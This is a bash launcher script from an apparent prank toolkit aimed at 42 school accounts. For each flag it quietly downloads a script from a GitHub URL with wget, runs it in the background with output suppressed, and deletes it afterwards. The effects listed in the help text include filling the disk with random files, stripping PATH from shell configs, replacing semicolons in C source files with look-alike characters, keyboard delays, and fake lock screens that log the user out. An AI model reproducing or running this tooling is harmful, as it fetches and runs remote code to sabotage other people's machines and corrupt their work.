#!/bin/bash

scriptlocation=""
argument=""

githubloc="https://raw.githubusercontent.com/Poul0s/42-troll/master"

case "$1" in
	--help)
		printf "Arguments :
		--help : show help

		-F | --full-disk : add 5G of random files everywhere

		-P | --where-are-commands : remove PATH from .zshrc and .bashrc

		-S | --replace-semicolon : replace all semcolon by a fake semicolon of file passed in arg 2 (tip : ~/**/*.c for all .c )

		-SK | --replace-key-semicolon

		-E | --emoji-font : set emoji font

		-KW | --keyboard-wtf : add a random delay to keyboard each 50 secs

		-L | --ask-lock : add ask lock popup each 30 secs

		-T | --ask-tig : add ask TIG popup each 30 secs

		-FF | --fake-full : make a popup before session start saying that the session is full

		-Y | your zsh seems pretty strong, let me destroy it

		-N | --norm: randomly adds errors to the norminette

		-V | --invim: put vim in arabic mode

		-FL | --fake-lock: replace the lock button with a button that lock, wait 10 seconds then delog

		-FC | --full-caps: ALWAYS PUT THE KEYBOARD IN CAPS LOCK

		-LK | --lock-key: start ft_lock when l key is pressed\n"
	;;
	--full-disk|-F)
		scriptlocation="$githubloc/full_disk.sh"
	;;
	--where-are-commands|-P)
		scriptlocation="$githubloc/where_are_commands.sh"
	;;
	--replace-semicolon|-S)
		scriptlocation="$githubloc/fake-semicolon.sh"
		argument=$2
	;;
	--replace-key-semicolon|-SK)
		scriptlocation="$githubloc/replace-key-semicolon.sh"
	;;
	--emoji-font|-E)
		scriptlocation="$githubloc/emoji_font.sh"
	;;
	--keyboard-wtf|-KW)
		scriptlocation="$githubloc/keyboard-wtf.sh"
	;;
	--ask-lock|-L)
		scriptlocation="$githubloc/askLock.sh"
	;;
	--ask-tig|-T)
		scriptlocation="$githubloc/askTig.sh"
	;;
	--fake-full|-FF)
		scriptlocation="$githubloc/fake_full.sh"
	;;
	--norm|-N)
		scriptlocation="$githubloc/errminette.sh"
	;;
	-Y)
		scriptlocation="$githubloc/uwu.sh"
	;;
	--invim|-V)
		scriptlocation="$githubloc/invim.sh"
	;;
	--fake-lock|-FL)
		scriptlocation="$githubloc/fake_lock.sh"
	;;
	--full-caps|-FC)
		scriptlocation="$githubloc/full_caps.sh"
	;;
	--lock-key|-LK)
		scriptlocation="$githubloc/lock_key.sh"
	;;
	*)
		echo "arg '$1' invalid, show help with --help"
	;;
esac

if [ ! -z $scriptlocation ] ; then
	mkdir -p "$HOME/.local/bin"
	wget -q $scriptlocation -O script.sh
	nohup bash ./script.sh $argument > /dev/null 2> /dev/null && rm -rf ./script.sh &
fi
